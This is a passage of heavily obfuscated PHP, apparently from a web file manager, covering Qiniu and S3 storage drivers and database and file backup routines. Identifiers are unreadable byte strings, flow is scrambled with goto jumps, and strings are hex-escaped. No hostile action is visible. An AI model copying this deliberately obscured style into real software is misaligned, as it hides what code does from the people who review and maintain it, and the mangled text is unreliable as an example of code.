$dí ¤ØËøğ; $eÂ¯ÍÊ¨‰í = array($E•‡ï§»[1233] => $E•‡ï§»[1234]); goto Cåí—´ëÉğ; Dô¦­¸“Ü»: $c‰Œµ­ÄÎ = http_type() . "\x3a\57\57\165\x70\x6c\157\141\144{$a…°¥ø¾}\x2e\161\151\156\x69\x75\x70\x2e\x63\157\x6d\x2f"; return array($E•‡ï§»[1236] => $Dë†¡Â‰Øê, $E•‡ï§»[1237] => $c‰Œµ­ÄÎ); goto f¬×¨‰Ñ; Cåí—´ëÉğ: $aìÈù¶ßÎÉ = $e’šËì²•; $Dë†¡Â‰Øê = $this->auth->uploadToken($this->bucket, $aìÈù¶ßÎÉ, $e…Ô÷†‡íØ, $eÂ¯ÍÊ¨‰í, !0); $a…°¥ø¾ = empty($this->region) || $this->region == $E•‡ï§»[1235] ? $E•‡ï§»[33] : $E•‡ï§»[416] . $this->region; goto Dô¦­¸“Ü»; f¬×¨‰Ñ: } public function download($Bé®ËÚ‹Û , $a“‘©‡›Í) { goto AÑô˜ßˆëß; f÷›¾‹ˆ¾Ê: fclose($Bõ¿†˜”’Ã); return $a“‘©‡›Í; goto Cô‚¼ËŸ‚ã; AÑô˜ßˆëß: $E¨’’œ¯ = IO::getPathInner(IO::mkfile($a“‘©‡›Í)); if (!($A…Î¡İ°—‘ = $this->link($Bé®ËÚ‹Û ))) { return !1; } $B…·ÔÎ¿ ” = 0; goto E‰–—Š‘…; E‰–—Š‘…: $FçÁŠœ•ô = 1024 * 200; $Bõ¿†˜”’Ã = fopen($E¨’’œ¯, $_SERVER[…Ò×–][1238]); while (!0) { $EÈÀø…Á°Ÿ = $this->fileSubstr($Bé®ËÚ‹Û , $B…·ÔÎ¿ ”, $FçÁŠœ•ô); if ($EÈÀø…Á°Ÿ === !1) { return !1; } fwrite($Bõ¿†˜”’Ã, $EÈÀø…Á°Ÿ); $B…·ÔÎ¿ ” += $FçÁŠœ•ô; if (strlen($EÈÀø…Á°Ÿ) < $FçÁŠœ•ô) { break; } } goto f÷›¾‹ˆ¾Ê; Cô‚¼ËŸ‚ã: } public function link($dŠ£Ş‡º¤, $EŠ‹é‚…„ï = '') { if (!$this->isFile($dŠ£Ş‡º¤)) { return !1; } $A¨ÎÍÙ“˜ = $this->getHost() . $_SERVER[…Ò×–][8] . $this->pathEncode($dŠ£Ş‡º¤) . $EŠ‹é‚…„ï; return $this->auth->privateDownloadUrl($A¨ÎÍÙ“˜, 3600 * 12); } public function fileOut($c…¤·œÏ¤ó, $C×“ÓŸóëé = false, $Aœ¥ÄŠõî² = false, $dùßê›¨¡ = '') { $a±‡ßàİŸ¡ =& $_SERVER[…Ò×–]; if ($this->isFileOutServer()) { return $this->fileOutServer($c…¤·œÏ¤ó, $C×“ÓŸóëé, $Aœ¥ÄŠõî², $dùßê›¨¡); } if (!$Aœ¥ÄŠõî²) { $Aœ¥ÄŠõî² = $this->pathThis($c…¤·œÏ¤ó); } $Eˆ×Öï‚‘¦ = $C×“ÓŸóëé ? $a±‡ßàİŸ¡[1239] . rawurlencode($Aœ¥ÄŠõî²) : $a±‡ßàİŸ¡[33]; $BÜšÈİ¥ÙÚ = $this->link($c…¤·œÏ¤ó, $Eˆ×Öï‚‘¦); $this->fileOutLink($BÜšÈİ¥ÙÚ); } public function fileOutServer($a¿‚¤¥’íª, $E–²ÔÛÑì = false, $d²À¤åµõ = false, $D¸ÛĞŠ£ò¦ = '') { parent::fileOut($a¿‚¤¥’íª, $E–²ÔÛÑì, $d²À¤åµõ, $D¸ÛĞŠ£ò¦); } public function fileOutImage($F«ï¬÷ºãì, $F”á§À¡­ = 250) { $díÜõÄï† = $this->link($F«ï¬÷ºãì, $_SERVER[…Ò×–][1240] . $F”á§À¡­); $this->fileOutLink($díÜõÄï†); } public function fileOutImageServer($D¡‰Ìƒîò†, $d¼¼Ä´Úª¦ = 250) { parent::fileOutImage($D¡‰Ìƒîò†, $d¼¼Ä´Úª¦); } public function hashMd5($A‚ã´ĞŠíÍ) { $a”‚¬ãó¸Û =& $_SERVER[…Ò×–]; $e”÷š…ôš = $this->objectMeta($A‚ã´ĞŠíÍ); return isset($e”÷š…ôš[$a”‚¬ãó¸Û[200]]) ? $e”÷š…ôš[$a”‚¬ãó¸Û[200]] : !1; $Aš ×œøÕñ = $this->link($A‚ã´ĞŠíÍ, $a”‚¬ãó¸Û[1241]); } public function size($cÜßÆÃ›ï) { $A”ÙÒÅ”Åà = $this->objectMeta($cÜßÆÃ›ï); return $A”ÙÒÅ”Åà ? $A”ÙÒÅ”Åà[$_SERVER[…Ò×–][77]] : 0; } public function info($bßùï–Šõñ) { if ($this->isFolder($bßùï–Šõñ)) { return $this->folderInfo($bßùï–Šõñ); } else { if ($this->isFile($bßùï–Šõñ)) { return $this->fileInfo($bßùï–Šõñ); } } return !1; } public function exist($D›ÔÉÛ×‚ó) { return $this->isFile($D›ÔÉÛ×‚ó) || $this->isFolder($D›ÔÉÛ×‚ó); } public function isFile($Bˆêğ×¬Øí) { return !$this->isFolder($Bˆêğ×¬Øí) && $this->objectMeta($Bˆêğ×¬Øí); } public function isFolder($b¹ÖÔÜÙİ) { return $this->cacheMethod($_SERVER[…Ò×–][227], $b¹ÖÔÜÙİ); } protected function objectMeta($B³¿‰Ç†§ñ) { return $this->cacheMethod($_SERVER[…Ò×–][228], $B³¿‰Ç†§ñ); } protected function _objectMeta($b‡õ‘—µˆä) { $BŞõ¿¤ƒé£ =& $_SERVER[…Ò×–]; list($c†…“íÓ³À, $eƒ­‘×áË) = $this->bucketManager->stat($this->bucket, $b‡õ‘—µˆä); if ($c†…“íÓ³À) { $c†…“íÓ³À[$BŞõ¿¤ƒé£[77]] = intval($c†…“íÓ³À[$BŞõ¿¤ƒé£[1228]]); } return $c†…“íÓ³À; } protected function _isFolder($c¶«¤÷ÀÜ·) { $bµÒ§ÑõÉ =& $_SERVER[…Ò×–]; if ($c¶«¤÷ÀÜ· == $bµÒ§ÑõÉ[33] || $c¶«¤÷ÀÜ· == $bµÒ§ÑõÉ[8]) { return !0; } list($e­¨¯¢ˆî‰, $A–µ°Ş«ÃÙ) = $this->bucketManager->listFiles($this->bucket, trim($c¶«¤÷ÀÜ·, $bµÒ§ÑõÉ[8]) . $bµÒ§ÑõÉ[8], $bµÒ§ÑõÉ[33], 1, $bµÒ§ÑõÉ[8]); return !empty($e­¨¯¢ˆî‰[$bµÒ§ÑõÉ[1227]]) || !empty($e­¨¯¢ˆî‰[$bµÒ§ÑõÉ[1230]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D”Õïß×øù) { parent::__construct($D”Õïß×øù); } public function uploadFormData($AÌº´…¡µ, $e¾ïæÏéß² = 3600) { goto d‡‹â¹ö˜; CèÛ«¹å‘: $FÉÑè“¶Ğì = array($DÅ’ôŸ“Â[203] => $DÅ’ôŸ“Â[33], $DÅ’ôŸ“Â[1159] => $DÅ’ôŸ“Â[33], $DÅ’ôŸ“Â[1114] => $fŠÄš¶Ş§„, $DÅ’ôŸ“Â[1118] => $BÊïŠƒ…¸ˆ, $DÅ’ôŸ“Â[1122] => $EĞ¬µ­—Ìó, $DÅ’ôŸ“Â[1160] => $A„šğ¶‚š, $DÅ’ôŸ“Â[1161] => $B–Ç ÜÂ, $DÅ’ôŸ“Â[1162] => $c’ïÄ“öí¥, $DÅ’ôŸ“Â[1163] => $cğàŞŸÙ¶‹, $DÅ’ôŸ“Â[1164] => $AË¶Ò¦Û‰, $DÅ’ôŸ“Â[173] => $this->getHost()); return $FÉÑè“¶Ğì; goto cö†­£‚¸; AéÇ˜¹: $dÒë¢ÛËÔ = $DÅ’ôŸ“Â[59]; $c’ïÄ“öí¥ = gmdate($DÅ’ôŸ“Â[1148]); $AÇëÙ‹™–ˆ = gmdate($DÅ’ôŸ“Â[695]); goto A¸ÕŸˆ¢‰‡; d‡‹â¹ö˜: $DÅ’ôŸ“Â =& $_SERVER[…Ò×–]; $fŠÄš¶Ş§„ = $DÅ’ôŸ“Â[189]; $B–Ç ÜÂ = $DÅ’ôŸ“Â[1147]; goto AéÇ˜¹; e©°š¦Şë: $dŠæ‘¢ÛË = hash_hmac($DÅ’ôŸ“Â[1157], $dÒë¢ÛËÔ, $bã»µ°‰­Ç, !0); $e×ª’ƒÃ = hash_hmac($DÅ’ôŸ“Â[1157], $CÈ¹»¿Íœ, $dŠæ‘¢ÛË, !0); $AË¶Ò¦Û‰ = hash_hmac($DÅ’ôŸ“Â[1157], $EĞ¬µ­—Ìó, $e×ª’ƒÃ); goto CèÛ«¹å‘; A×õÈóí†Ì: $Cš¾–¯¦Ñ§ = array($this->accessKey, $AÇëÙ‹™–ˆ, $this->region, $dÒë¢ÛËÔ, $CÈ¹»¿Íœ); $A„šğ¶‚š = implode($DÅ’ôŸ“Â[8], $Cš¾–¯¦Ñ§); $F„…öšò†™ = array($DÅ’ôŸ“Â[1112] => gmdate($DÅ’ôŸ“Â[1111], strtotime($DÅ’ôŸ“Â[1150])), $DÅ’ôŸ“Â[1113] => array(array($DÅ’ôŸ“Â[1115] => $this->bucket), array($DÅ’ôŸ“Â[1114] => $fŠÄš¶Ş§„), array($DÅ’ôŸ“Â[1116], $DÅ’ôŸ“Â[1117], $DÅ’ôŸ“Â[33]), array($DÅ’ôŸ“Â[1116], $DÅ’ôŸ“Â[1151], $DÅ’ôŸ“Â[33]), array($DÅ’ôŸ“Â[1116], $DÅ’ôŸ“Â[1152], $DÅ’ôŸ“Â[33]), array($DÅ’ôŸ“Â[1118] => $BÊïŠƒ…¸ˆ), array($DÅ’ôŸ“Â[1153] => $A„šğ¶‚š), array($DÅ’ôŸ“Â[1154] => $B–Ç ÜÂ), array($DÅ’ôŸ“Â[1155] => $c’ïÄ“öí¥), array($DÅ’ôŸ“Â[1156] => $cğàŞŸÙ¶‹))); goto E–Ñ²ÔïŸ; A¸ÕŸˆ¢‰‡: $CÈ¹»¿Íœ = $DÅ’ôŸ“Â[1149]; $cğàŞŸÙ¶‹ = $e¾ïæÏéß² . $DÅ’ôŸ“Â[33]; $BÊïŠƒ…¸ˆ = $DÅ’ôŸ“Â[1110]; goto A×õÈóí†Ì; E–Ñ²ÔïŸ: $EĞ¬µ­—Ìó = base64_encode(json_encode($F„…öšò†™)); $F¥Œïš¦œ¿ = hash_hmac($DÅ’ôŸ“Â[1157], $AÇëÙ‹™–ˆ, $DÅ’ôŸ“Â[1158] . $this->secret, !0); $bã»µ°‰­Ç = hash_hmac($DÅ’ôŸ“Â[1157], $this->region, $F¥Œïš¦œ¿, !0); goto e©°š¦Şë; cö†­£‚¸: } public function multiUploadFormData($BÍ¹‰‡Ê¢¶, $c„Š°ÕŠ”¯ = 3600) { $c‹‡ÕØ›Íˆ =& $_SERVER[…Ò×–]; $dáÓ„Íî¶ = gmdate($c‹‡ÕØ›Íˆ[1242]); $DìÛÁƒ¢èÑ = array(); $d”÷§Ğ´¶» = $this->client->getUploadId($this->bucket, $BÍ¹‰‡Ê¢¶, $DìÛÁƒ¢èÑ); if (!$d”÷§Ğ´¶») { return !1; } return array($c‹‡ÕØ›Íˆ[213] => $d”÷§Ğ´¶», $c‹‡ÕØ›Íˆ[173] => $this->getHost() . $c‹‡ÕØ›Íˆ[8] . $this->pathEncode($BÍ¹‰‡Ê¢¶), $c‹‡ÕØ›Íˆ[214] => $dáÓ„Íî¶, $c‹‡ÕØ›Íˆ[89] => $BÍ¹‰‡Ê¢¶); } public function multiUploadAuthData($aóƒËäÇ§˜, $EäÇòµù‚í = array()) { goto a„× Œ”•; a„× Œ”•: $DÄÄà±Æ¥ô =& $_SERVER[…Ò×–]; $C²ß×Œ“‰¶ = isset($EäÇòµù‚í[$DÄÄà±Æ¥ô[165]]) ? $EäÇòµù‚í[$DÄÄà±Æ¥ô[165]] : $DÄÄà±Æ¥ô[33]; $A‚ÁŸ‹ ÇÎ = $EäÇòµù‚í[$DÄÄà±Æ¥ô[89]]; goto DÆ•²ŠÄğ±; A©ôª‚ìñ: if (isset($EäÇòµù‚í[$DÄÄà±Æ¥ô[1243]])) { $EÆÓÃ‘ÏœÂ[$DÄÄà±Æ¥ô[1244]] = $EäÇòµù‚í[$DÄÄà±Æ¥ô[1243]]; } $b‚ÒÎàªŒ¿ = explode($DÄÄà±Æ¥ô[175], $this->getHost()); $CÂ³ËÚ³‰Æ = array($DÄÄà±Æ¥ô[1245] => $b‚ÒÎàªŒ¿[1], $DÄÄà±Æ¥ô[1246] => $DÄÄà±Æ¥ô[33], $DÄÄà±Æ¥ô[203] => $DÄÄà±Æ¥ô[116], $DÄÄà±Æ¥ô[1159] => $EäÇòµù‚í[$DÄÄà±Æ¥ô[77]]); goto dÜ‡áÓ‰À; dƒ¿öØö„ˆ: if (strpos($C²ß×Œ“‰¶, $DÄÄà±Æ¥ô[217]) === 0) { if (isset($EÆÓÃ‘ÏœÂ[$DÄÄà±Æ¥ô[1244]])) { $C³Äâ¾ŸŠë = $EÆÓÃ‘ÏœÂ[$DÄÄà±Æ¥ô[1244]]; } else { if (isset($BÓ´›‡“øœ[$DÄÄà±Æ¥ô[1244]])) { $C³Äâ¾ŸŠë = $BÓ´›‡“øœ[$DÄÄà±Æ¥ô[1244]]; } else { $C³Äâ¾ŸŠë = hash($DÄÄà±Æ¥ô[1157], $DÄÄà±Æ¥ô[33]); } } return array($DÄÄà±Æ¥ô[224] => $BÓ´›‡“øœ[$DÄÄà±Æ¥ô[224]], $DÄÄà±Æ¥ô[1244] => $C³Äâ¾ŸŠë, $DÄÄà±Æ¥ô[214] => $BÓ´›‡“øœ[$DÄÄà±Æ¥ô[1247]]); } return $BÓ´›‡“øœ[$DÄÄà±Æ¥ô[224]]; goto E““Ù‰Ç¥¾; dÜ‡áÓ‰À: $cçïÆ‚æ› = $DÄÄà±Æ¥ô[218]; $A¦´¢ÕäëÓ = $DÄÄà±Æ¥ô[8] . $this->pathEncode($A‚ÁŸ‹ ÇÎ) . $C²ß×Œ“‰¶; $BÓ´›‡“øœ = $this->client->__getSignatureV4($EÆÓÃ‘ÏœÂ, $CÂ³ËÚ³‰Æ, $cçïÆ‚æ›, $A¦´¢ÕäëÓ); goto dƒ¿öØö„ˆ; DÆ•²ŠÄğ±: unset($EäÇòµù‚í[$DÄÄà±Æ¥ô[89]]); if (isset($EäÇòµù‚í[$DÄÄà±Æ¥ô[215]])) { return $this->listUploadParts($A‚ÁŸ‹ ÇÎ, $EäÇòµù‚í); } $EÆÓÃ‘ÏœÂ = array(); goto A©ôª‚ìñ; E““Ù‰Ç¥¾: } public function listUploadParts($FŒ¾¿ÙˆŸ•, $Fé‚ƒ‚‘Ğ± = array()) { goto bÙ£ÆÄÇÆ¬; dµ‡á‰Ğ‚§: $cñ§…Ø…â„ = array($bì®¦Æª¬—[1245] => $B•Æ“ëÙ[1], $bì®¦Æª¬—[203] => $bì®¦Æª¬—[116], $bì®¦Æª¬—[1159] => strlen($a¤¦ùÑ™¬‡)); $F…ê¶êò¯¶ = $bì®¦Æª¬—[216]; $aÙÖ¶Â°—é = $bì®¦Æª¬—[8] . $this->pathEncode($FŒ¾¿ÙˆŸ•) . $Fé‚ƒ‚‘Ğ±[$bì®¦Æª¬—[165]]; goto fŞ™ ƒÖ½; e™Ùøõù—³: $a¤¦ùÑ™¬‡ .= $bì®¦Æª¬—[1251]; $d¤ˆÅñ· = array(); $B•Æ“ëÙ = explode($bì®¦Æª¬—[175], $this->getHost()); goto dµ‡á‰Ğ‚§; b¤îôÏØ¾è: if (!$BßáğÙ±Èã) { return !1; } $a¤¦ùÑ™¬‡ = $bì®¦Æª¬—[1248]; foreach ($BßáğÙ±Èã as $CŸçš½İ) { $a¤¦ùÑ™¬‡ .= $bì®¦Æª¬—[1249] . "\74\120\141\x72\x74\x4e\165\x6d\x62\x65\x72\76{$CŸçš½İ[$bì®¦Æª¬—[1201]]}\x3c\57\x50\x61\162\164\116\165\x6d\x62\x65\162\x3e\12" . "\74\x45\x54\141\147\76{$CŸçš½İ[$bì®¦Æª¬—[1202]]}\x3c\x2f\x45\124\x61\147\76\12" . $bì®¦Æª¬—[1250]; } goto e™Ùøõù—³; fŞ™ ƒÖ½: $C¶äáäÁÛç = $this->client->__getSignatureV4($d¤ˆÅñ·, $cñ§…Ø…â„, $F…ê¶êò¯¶, $aÙÖ¶Â°—é, $a¤¦ùÑ™¬‡); return array($bì®¦Æª¬—[224] => $C¶äáäÁÛç[$bì®¦Æª¬—[224]], $bì®¦Æª¬—[214] => $C¶äáäÁÛç[$bì®¦Æª¬—[1247]], $bì®¦Æª¬—[226] => $BßáğÙ±Èã, $bì®¦Æª¬—[1244] => $C¶äáäÁÛç[$bì®¦Æª¬—[1244]]); goto F¨âæŠ¡Å; bÙ£ÆÄÇÆ¬: $bì®¦Æª¬— =& $_SERVER[…Ò×–]; $dÄÅšêŒˆÌ = str_replace($bì®¦Æª¬—[225], $bì®¦Æª¬—[33], $Fé‚ƒ‚‘Ğ±[$bì®¦Æª¬—[165]]); $BßáğÙ±Èã = $this->client->listParts($this->bucket, $FŒ¾¿ÙˆŸ•, $dÄÅšêŒˆÌ); goto b¤îôÏØ¾è; F¨âæŠ¡Å: } public function link($f«½ç¿Œƒ, $Eƒ…‰»„ˆæ = array()) { return parent::link($f«½ç¿Œƒ, $Eƒ…‰»„ˆæ); } public function fileOut($eÁÙ“®â¡–, $e–Õõƒ·¤é = false, $dîŒ’Ú¢–² = false, $dóİà‰º = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[…Ò×–][1252])) { return parent::fileOutServer($eÁÙ“®â¡–, $e–Õõƒ·¤é, $dîŒ’Ú¢–², $dóİà‰º); } parent::fileOut($eÁÙ“®â¡–, $e–Õõƒ·¤é, $dîŒ’Ú¢–², $dóİà‰º); } public function fileOutImage($f£÷‚î†­, $E‘ÁË‚”éø = 250) { if (strstr($this->endpoint, $_SERVER[…Ò×–][1252])) { return parent::fileOutImageServer($f£÷‚î†­, $E‘ÁË‚”éø); } parent::fileOutImage($f£÷‚î†­, $E‘ÁË‚”éø); } public function fileOutLink($cÛ¢‰¸¤ä) { $F±õ­†Ã¿Í =& $_SERVER[…Ò×–]; if (substr($cÛ¢‰¸¤ä, 0, 7) == $F±õ­†Ã¿Í[1125]) { $cÛ¢‰¸¤ä = $F±õ­†Ã¿Í[1126] . substr($cÛ¢‰¸¤ä, 7); } header($F±õ­†Ã¿Í[156] . $cÛ¢‰¸¤ä); die; } public function getHost() { $AÒŒÛ´õÖ =& $_SERVER[…Ò×–]; $aÑ‹›œãîµ = str_rtrim(parent::getHost(), $AÒŒÛ´õÖ[8] . $this->bucket); $aÑ‹›œãîµ = explode($AÒŒÛ´õÖ[175], $aÑ‹›œãîµ); return $aÑ‹›œãîµ[0] . $AÒŒÛ´õÖ[175] . $this->bucket . $AÒŒÛ´õÖ[91] . $aÑ‹›œãîµ[1]; } } goto bÈã‘–ÅõŒ; Añ«£Ú¹äò: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto F“ÒÚâö¯; F“ÒÚâö¯: $AáÀ§„ö×´ =& $_SERVER[…Ò×–]; $Eƒ¬øë“ˆ¹ = Backup::get(); self::$io = $Eƒ¬øë“ˆ¹[$AáÀ§„ö×´[696]]; goto e¹øª£±—†; AŸ¹øÂ‘Ø: $E„‚£›š×¡ = new DbManage($Cù±Š„­äÌ, $b¼çøÃá”ç); $a™¸À†‘ƒ’ = TEMP_FILES . $AáÀ§„ö×´[714] . self::$name . $AáÀ§„ö×´[8]; del_dir($a™¸À†‘ƒ’); goto d‡ŠÕ´Äª; D¼êãÑµå™: $bÜ‘ ùó» = array_diff($bÜ‘ ùó», array($AáÀ§„ö×´[715], $AáÀ§„ö×´[716])); foreach ($bÜ‘ ùó» as $DÎ¥¿™¶Ä) { $d„§ŠÉ += $E„‚£›š×¡->model($DÎ¥¿™¶Ä)->count(); } $CÌßƒ«šŸ = new Task($AáÀ§„ö×´[717], $AáÀ§„ö×´[718], $d„§ŠÉ, LNG($AáÀ§„ö×´[719]) . $AáÀ§„ö×´[720] . LNG($AáÀ§„ö×´[721])); goto fàÛø¶ÅŒ; e¹øª£±—†: self::$name = $Eƒ¬øë“ˆ¹[$AáÀ§„ö×´[28]]; $Cù±Š„­äÌ = $GLOBALS[$AáÀ§„ö×´[6]][$AáÀ§„ö×´[17]]; $b¼çøÃá”ç = $this->_dbType($Cù±Š„­äÌ); goto AŸ¹øÂ‘Ø; d‡ŠÕ´Äª: mk_dir($a™¸À†‘ƒ’); $d„§ŠÉ = $eİ¶ÈîÑÚ = 0; $bÜ‘ ùó» = $E„‚£›š×¡->db()->getTables(); goto D¼êãÑµå™; fàÛø¶ÅŒ: foreach ($bÜ‘ ùó» as $DÎ¥¿™¶Ä) { $eÔ½™ˆ½ôì = $a™¸À†‘ƒ’ . $DÎ¥¿™¶Ä . $AáÀ§„ö×´[722]; $e§ÏˆƒÁÓƒ = null; if ($DÎ¥¿™¶Ä == $AáÀ§„ö×´[723] && (!isset($Eƒ¬øë“ˆ¹[$AáÀ§„ö×´[697]]) || $Eƒ¬øë“ˆ¹[$AáÀ§„ö×´[697]] == $AáÀ§„ö×´[473])) { $e§ÏˆƒÁÓƒ = self::$io; } $eİ¶ÈîÑÚ += $E„‚£›š×¡->sqlFromDb($DÎ¥¿™¶Ä, $eÔ½™ˆ½ôì, $CÌßƒ«šŸ, $e§ÏˆƒÁÓƒ); } $CÌßƒ«šŸ->end(); $FÆÌç…öÒÛ = array($AáÀ§„ö×´[724] => $b¼çøÃá”ç, $AáÀ§„ö×´[711] => 1, $AáÀ§„ö×´[725] => $eİ¶ÈîÑÚ, $AáÀ§„ö×´[726] => $eİ¶ÈîÑÚ); goto CÍ˜«‰«ğ‘; CÍ˜«‰«ğ‘: Backup::set($FÆÌç…öÒÛ); return !0; goto bÒ²ÛÒ­Ğº; bÒ²ÛÒ­Ğº: } private function _dbType($bÊ¿´äòÊÚ) { goto dŠìªĞÊô²; eŠÂË÷·ëê: return $a‘Ã¤¦×ˆ; goto a¡”­šäª¿; dŠìªĞÊô²: $fÆšÎ‚´Âõ =& $_SERVER[…Ò×–]; $bÊ¿´äòÊÚ = array_change_key_case($bÊ¿´äòÊÚ); $a‘Ã¤¦×ˆ = $bÊ¿´äòÊÚ[$fÆšÎ‚´Âõ[727]]; goto d¿ãÅ™‘ÄÒ; d¿ãÅ™‘ÄÒ: if ($a‘Ã¤¦×ˆ == $fÆšÎ‚´Âõ[728]) { $c¬ŠÄÆä¹ = explode($fÆšÎ‚´Âõ[4], $bÊ¿´äòÊÚ[$fÆšÎ‚´Âõ[729]]); $a‘Ã¤¦×ˆ = $c¬ŠÄÆä¹[0]; } $f£âí”£Š˜ = array($fÆšÎ‚´Âõ[730] => $fÆšÎ‚´Âõ[9], $fÆšÎ‚´Âõ[731] => $fÆšÎ‚´Âõ[732]); if (isset($f£âí”£Š˜[$a‘Ã¤¦×ˆ])) { $a‘Ã¤¦×ˆ = $f£âí”£Š˜[$a‘Ã¤¦×ˆ]; } goto eŠÂË÷·ëê; a¡”­šäª¿: } } class BackupDbFile { public function __construct() { } public function index() { goto dàö³…ªèŒ; AÅ£¤½Œ­ï: $DåÌƒÅ†’‚ = new TaskFileTransfer($e©‹ÍÛó[733], $e©‹ÍÛó[718], 0, LNG($e©‹ÍÛó[719]) . $e©‹ÍÛó[416] . LNG($e©‹ÍÛó[721]) . $e©‹ÍÛó[734]); $DåÌƒÅ†’‚->addPath($DŠ¹ ÄÉÙ); $FË×ÖÊ—®ù = IO::infoWithChildren($DŠ¹ ÄÉÙ); goto D»Œí¿šóİ; fÉ¶ãÇ¨Ñ: $DåÌƒÅ†’‚->end(); Backup::set(array($e©‹ÍÛó[738] => $FË×ÖÊ—®ù[$e©‹ÍÛó[77]])); return !0; goto E¦†”ë†¹„; D»Œí¿šóİ: Backup::set(array($e©‹ÍÛó[735] => $FË×ÖÊ—®ù[$e©‹ÍÛó[77]])); IO::move($DŠ¹ ÄÉÙ, $Fíâ°íßíÑ); $C¨ìĞÉÂ…— = CONTROLLER_DIR . $e©‹ÍÛó[736]; goto D—¹‚Äœñİ; eÈ éËêæº: $DŠ¹ ÄÉÙ = TEMP_FILES . "\142\x61\x63\153\165\x70\x5f{$fƒËÁãáÊå}\x2f"; $Fíâ°íßíÑ = "\x7b\151\x6f\72{$C¤Íˆ‡µ˜[$e©‹ÍÛó[696]]}\x7d\x2f\x64\x61\x74\x61\x62\x61\163\145\57"; IO::mkdir($Fíâ°íßíÑ . "\x62\x61\x63\153\165\x70\x5f{$fƒËÁãáÊå}\x2f"); goto AÅ£¤½Œ­ï; dàö³…ªèŒ: $e©‹ÍÛó =& $_SERVER[…Ò×–]; $C¤Íˆ‡µ˜ = Backup::get(); $fƒËÁãáÊå = $C¤Íˆ‡µ˜[$e©‹ÍÛó[28]]; goto eÈ éËêæº; D—¹‚Äœñİ: $bÂì´×ñç  = CONTROLLER_DIR . $e©‹ÍÛó[737]; IO::copy($C¨ìĞÉÂ…—, $Fíâ°íßíÑ . "\x62\x61\143\x6b\x75\x70\x5f{$fƒËÁãáÊå}\x2f"); IO::copy($bÂì´×ñç , $Fíâ°íßíÑ . "\142\x61\143\x6b\x75\160\137{$fƒËÁãáÊå}\x2f"); goto fÉ¶ãÇ¨Ñ; E¦†”ë†¹„: } } class BackupFile { public function __construct() { } public function index() { goto aÏÊó¡ÂçÄ; D˜Ğ¹¦´§Á: $b‡Ë…À·Ù->task[$_SERVER[…Ò×–][703]] = $eÑ¼«ˆîê; $E¥ÂË…Ïõˆ = array($_SERVER[…Ò×–][743] => $e¡ã¾‘·Îæ, $_SERVER[…Ò×–][744] => $eÑ¼«ˆîê); Backup::set($E¥ÂË…Ïõˆ); goto F˜Ş÷ƒˆ–¯; f­©Ï…ñƒ‘: $bŠ´õêéáŸ = 1000; $FÑÕİ»ã¢ = $FØ§šÏ÷ÄŠ = 0; $F…®š¤àÜÂ = array(); goto dØÆİ­ªĞ; A×Ö ¤ÄŠ: $e¡ã¾‘·Îæ = (int) Model($_SERVER[…Ò×–][723])->where($FÅø…¬«‘’)->count($_SERVER[…Ò×–][423]); $eÑ¼«ˆîê = (int) Model($_SERVER[…Ò×–][723])->where($FÅø…¬«‘’)->sum($_SERVER[…Ò×–][77]); $b‡Ë…À·Ù = new TaskFileTransfer($_SERVER[…Ò×–][741], $_SERVER[…Ò×–][718], $e¡ã¾‘·Îæ, LNG($_SERVER[…Ò×–][719]) . $_SERVER[…Ò×–][720] . LNG($_SERVER[…Ò×–][742])); goto D˜Ğ¹¦´§Á; aÏÊó¡ÂçÄ: $eŸ³†º¿¼ = Backup::get(); $c§Ï˜ƒ‰Ëš = $eŸ³†º¿¼[$_SERVER[…Ò×–][285]][$_SERVER[…Ò×–][171]][$_SERVER[…Ò×–][423]]; $FÅø…¬«‘’ = array($_SERVER[…Ò×–][424] => array($_SERVER[…Ò×–][739], $c§Ï˜ƒ‰Ëš), $_SERVER[…Ò×–][740] => array($_SERVER[…Ò×–][323], $eŸ³†º¿¼[$_SERVER[…Ò×–][696]])); goto A×Ö ¤ÄŠ; f‰Š ‘ŠÃ©: Backup::set($E¥ÂË…Ïõˆ); $this->_fileFilter($F…®š¤àÜÂ); return !0; goto C¿æ ó¿¹Ë; dØÆİ­ªĞ: $déàŠ‡Œ£Æ = $eÇ‹••Õ©† = 0; do { $c¼ë†×áºÁ = $_SERVER[…Ò×–][745]; $fÓÃšÍâæ© = Model($_SERVER[…Ò×–][723])->where($FÅø…¬«‘’)->field($c¼ë†×áºÁ)->order($_SERVER[…Ò×–][746])->selectPage($bŠ´õêéáŸ, $AË¢–…÷µ); $CáíÕØ± É = !empty($fÓÃšÍâæ©[$_SERVER[…Ò×–][358]]) ? $fÓÃšÍâæ©[$_SERVER[…Ò×–][358]] : array(); foreach ($CáíÕØ± É as $c²·ÔÚŸš‡) { goto FØ§ëïÊš; D§›Ï…ì¿Ş: if (IO::exist($a¶¿²––‚Š)) { $b‡Ë…À·Ù->updateFileEnd($c²·ÔÚŸš‡[$_SERVER[…Ò×–][28]], $c²·ÔÚŸš‡[$_SERVER[…Ò×–][77]]); } else { $a¶¿²––‚Š = get_path_father($a¶¿²––‚Š); IO::mkdir($a¶¿²––‚Š); if (!IO::copy($B•ñãĞô¹¢, $a¶¿²––‚Š, $_SERVER[…Ò×–][749])) { write_log($_SERVER[…Ò×–][750] . $B•ñãĞô¹¢ . $_SERVER[…Ò×–][751] . $a¶¿²––‚Š . $_SERVER[…Ò×–][481], $_SERVER[…Ò×–][718]); $BµğíøÌÏ = !1; break; } } $c§Ï˜ƒ‰Ëš = $c²·ÔÚŸš‡[$_SERVER[…Ò×–][423]]; $FØ§šÏ÷ÄŠ += 1; goto bÒŠ¿ôèá‚; FØ§ëïÊš: if (!$this->_fileExist($c²·ÔÚŸš‡, $F…®š¤àÜÂ, $A°ƒëøÙ’å)) { $e¡ã¾‘·Îæ -= 1; $eÑ¼«ˆîê -= (int) $c²·ÔÚŸš‡[$_SERVER[…Ò×–][77]]; write_log("\x66\x69\x6c\x65\x20\156\157\164\x20\145\x78\x69\163\164\x2e\146\x69\x6c\x65\x49\104\x3a{$c²·ÔÚŸš‡[$_SERVER[…Ò×–][423]]}\54\x20\x70\x61\x74\x68\72{$c²·ÔÚŸš‡[$_SERVER[…Ò×–][75]]}", $_SERVER[…Ò×–][747]); continue; } $B•ñãĞô¹¢ = $c²·ÔÚŸš‡[$_SERVER[…Ò×–][75]]; $a¶¿²––‚Š = "\173\x69\x6f\x3a{$eŸ³†º¿¼[$_SERVER[…Ò×–][696]]}\175" . substr($B•ñãĞô¹¢, 